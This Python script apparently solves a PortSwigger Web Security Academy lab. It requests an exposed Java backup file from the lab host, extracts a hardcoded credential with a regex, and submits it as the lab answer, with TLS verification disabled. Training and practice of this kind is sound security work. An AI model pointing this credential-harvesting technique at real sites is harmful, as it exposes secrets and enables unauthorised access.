import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0ade005f04f26241808da3170045000e.web-security-academy.net/" #change to lab URL

def findkey(url):
    final_url = url + "backup/ProductTemplate.java.bak"
    r = requests.get(final_url,verify=False)
    match = re.search(r'"(.+)"\n.+withAutoCommit',r.text)
    name = match.group(1)
    return name

def submitsolution(url,key):
    final_url = url + "submitSolution"
    data = {"answer":key}
    r = requests.post(final_url, data=data,verify=False)
    print(r.text)

key = findkey(url)
print(key)
submitsolution(url,key)